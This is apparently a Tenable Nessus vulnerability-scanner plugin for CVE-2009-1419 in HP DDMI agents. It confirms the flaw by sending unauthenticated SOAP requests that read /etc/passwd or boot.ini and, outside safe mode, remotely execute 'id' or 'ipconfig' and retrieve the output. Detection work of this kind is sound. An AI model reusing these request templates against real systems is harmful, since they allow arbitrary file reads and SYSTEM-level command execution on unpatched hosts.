#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(39617);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2009-1419");
  script_bugtraq_id(35250);
  script_osvdb_id(55787);
  script_xref(name:"Secunia", value:"35270");

  script_name(english:"HP DDMI on Windows Unspecified Remote Agent Access");
  script_summary(english:"Tries to retrieve a file or execute a command");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote SOAP server allows unauthorized access."
  );
  script_set_attribute( attribute:"description",  value:
"The remote host is running an HP Discovery & Dependency Mapping
Inventory (DDMI) agent to facilitate communications between a central
DDMI server and workstations that are part of the deployed inventory
process. 

The version of the agent on the remote host fails to check for
a valid SSL certificate from a known DDMI server before accepting
requests and processing them.  An unauthenticated, remote attacker can
leverage this issue to disclose sensitive information about installed
software, read the contents of arbitrary files, launch arbitrary
processes with SYSTEM privileges, etc."  );

  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/504134/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/508942/30/0/threaded"
  );
  script_set_attribute( attribute:"solution",  value:
"Apply Patch Number HPED_00306 (for DDMI version 7.5x) / HPED_00304
(version 2.5x)."  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/07/06");
 script_set_attribute(attribute:"patch_publication_date", value: "2009/06/04");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:discovery%26dependency_mapping_inventory");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 2738, 7738);
  exit(0);
}

#

include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


url = "/";
urn = "urn:aiagent";


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os)
  {
    cmd = string('cmd /c ipconfig /all > C:\\', SCRIPT_NAME, '-', unixtime(), '.log');
    file = 'C:\\boot.ini';
  }
  else 
  {
    cmd = string('/bin/sh -c "id > /tmp/', SCRIPT_NAME, '-', unixtime(), '.log"');
    file = '/etc/passwd';
  }

  cmds = make_list(cmd);
  files = make_list(file);
}
else
{
  cmds = make_list(
    string('/bin/sh -c "id > /tmp/', SCRIPT_NAME, '-', unixtime(), '.log"'),
    string('cmd /c ipconfig /all > C:\\', SCRIPT_NAME, '-', unixtime(), '.log"')
  );
  files = make_list('/etc/passwd', 'C:\\boot.ini');
}

cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['C:\\boot.ini'] = "^ *\[boot loader\]";


ports = add_port_in_list(list:get_kb_list("Services/www"), port:2738);
ports = add_port_in_list(list:ports, port:7738);

foreach port (ports)
{
  # Unless we're paranoid, make sure the banner looks like DDMI Agent.
  if (report_paranoia < 2)
  {
    banner = get_http_banner(port:port);
    if (!banner || "Server: gSOAP/" >!< banner) continue;
  }

  # If we're being safe...
  if (safe_checks())
  {
    # Be safe and just retrieve the contents of a file.
    method = "downloadFile";

    foreach file (files)
    {
      while (file[0] == ' ') file = substr(file, 1);

      postdata = string(
        "<?xml version='1.0' ?>", '\n',
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
        '<soap:Body>\n',
        '   <i:', method, ' xmlns:i="', urn, '">\n',
        '     <path>', file, '</path>\n',
        '   </i:', method, '>\n',
        ' </soap:Body>\n',
        '</soap:Envelope>'
      );
      req = http_mk_post_req(
        port        : port,
        version     : 11, 
        item        : url, 
        add_headers : make_array(
                        "Content-Type", "text/xml",
                        "SOAPMethodName", string(urn, "#", method)
                      ),
        data        : postdata
      );
      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) continue;

      # There's a problem if we were able to get a result.
      if ('ns:downloadFileResult><fileResult' >< res[2])
      {
        file_pat = file_pats[file];

        contents = "";
        if (
          '</SOAP-ENV:Envelope>' >< res[2] &&
          'application/octet-stream' >< res[2]
        ) 
        {
          i = stridx(res[2], '</SOAP-ENV:Envelope>') + 0x1e;
          while (i < strlen(res[2]))
          {
            l = getdword(pos:i, blob:res[2]);

            if (contents) i += 4;
            else i = stridx(res[2], 'application/octet-stream') + strlen('application/octet-stream');

            contents = strcat(contents, substr(res[2], i, i+l-1));

            i += l;
            if (i % 4) i += (4 - (i % 4));

            if (getdword(pos:i, blob:res[2]) != 0xa000000) break;
            i += 8;
          }
          contents = substr(contents, 0, strlen(contents)-1);
        }

        if (
          report_verbosity > 0 &&
          contents &&
          egrep(pattern:file_pat, string:contents)
        )
        {
          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "'", file, "' on the remote host using the following request :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req_str, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
          if (report_verbosity > 1)
          {
            report = string(
              report,
              "\n",
              "Here are its contents :\n",
              "\n",
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
              contents,
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
            );
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);

        exit(0);
      }
    }
  }
  # Otherwise...
  else
  {
    # Execute a command and retrieve the results from a file.
    method1 = "executeProcess";

    foreach cmd (cmds)
    {
      space = stridx(cmd, " ");
      if (space > 0)
      {
        exe = substr(cmd, 0, space-1);
        args = substr(cmd, space);
      }
      else
      {
        exe = cmd;
        args = "";
      }

      postdata1 = string(
        "<?xml version='1.0' ?>", '\n',
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
        '<soap:Body>\n',
        '   <i:', method1, ' xmlns:i="', urn, '">\n',
        '     <pszExePath>', exe, '</pszExePath>\n',
        '     <pszArgs>', args, '</pszArgs>\n',
        '   </i:', method1, '>\n',
        ' </soap:Body>\n',
        '</soap:Envelope>'
      );
      req1 = http_mk_post_req(
        port        : port,
        version     : 11, 
        item        : url, 
        add_headers : make_array(
                        "Content-Type", "text/xml",
                        "SOAPMethodName", string(urn, "#", method1)
                      ),
        data        : postdata1
      );
      res1 = http_send_recv_req(port:port, req:req1);
      if (isnull(res1)) continue;

      # There's a problem if we got an OK response.
      if ("ns:ApiExecResult><lRetCode>0</lRetCode><strRetMsg>OK<" >< res1[2])
      {
        report = "";

        if (report_verbosity > 0)
        {
          req1_str = http_mk_buffer_from_req(req:req1);

          report = string(
            "\n",
            "Nessus was able to exploit the issue to execute the command :\n",
            "\n",
            "  ", cmd, "\n",
            "\n",
            "using the following request :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req1_str, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );

          if (report_verbosity > 1 && ">" >< cmd)
          {
            # Try to grab the result.
            method2 = "downloadFile";
            file = strstr(cmd, '>') - '>';
            file = file - '"';
            while (file[0] == ' ') file = substr(file, 1);

            postdata2 = string(
              "<?xml version='1.0' ?>", '\n',
              '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
              '<soap:Body>\n',
              '   <i:', method2, ' xmlns:i="', urn, '">\n',
              '     <path>', file, '</path>\n',
              '   </i:', method2, '>\n',
              ' </soap:Body>\n',
              '</soap:Envelope>'
            );
            req2 = http_mk_post_req(
              port        : port,
              version     : 11, 
              item        : url, 
              add_headers : make_array(
                              "Content-Type", "text/xml",
                              "SOAPMethodName", string(urn, "#", method2)
                            ),
              data        : postdata2
            );
            # nb: sleeping for a bit avoids problems receiving the file contents.
            sleep(1);
            res2 = http_send_recv_req(port:port, req:req2);

            cmd_pat = '';
            foreach key (keys(cmd_pats))
              if (key >< cmd)
              {
                cmd_pat = cmd_pats[key];
                break;
              }

            contents = "";
            if (
              !isnull(res2) && 
              "ns:downloadFileResult><fileResult" >< res2[2] &&
              '</SOAP-ENV:Envelope>' >< res2[2] &&
              'application/octet-stream' >< res2[2]
            ) 
            {
              i = stridx(res2[2], '</SOAP-ENV:Envelope>') + 0x1e;
              while (i < strlen(res2[2]))
              {
                l = getdword(pos:i, blob:res2[2]);

                if (contents) i += 4;
                else i = stridx(res2[2], 'application/octet-stream') + strlen('application/octet-stream');

                contents = strcat(contents, substr(res2[2], i, i+l-1));

                i += l;
                if (i % 4) i += (4 - (i % 4));

                if (getdword(pos:i, blob:res2[2]) != 0xa000000) break;
                i += 8;
              }
              contents = substr(contents, 0, strlen(contents)-1);
            }

            if (
              !isnull(contents) && 
              cmd_pat &&
              egrep(pattern:cmd_pat, string:contents)
            )
            {
              req2_str = http_mk_buffer_from_req(req:req2);

              report = string(
                report,
                "\n",
                "Retrieving the contents of the generated file with the following\n",
                "request :\n",
                "\n",
                crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
                req2_str, "\n",
                crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
                "\n",
                "shows the following command output :\n",
                "\n",
                crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
                contents,
                crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
              );
            }
            else
            {
              report = string(
                report,
                "\n",
                "Nessus tried but was unable to retrieve the file to which command\n",
                "output was directed, perhaps because of a timeout issue.\n"
              );
            }
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);

        exit(0);
      }
    }
  }
}
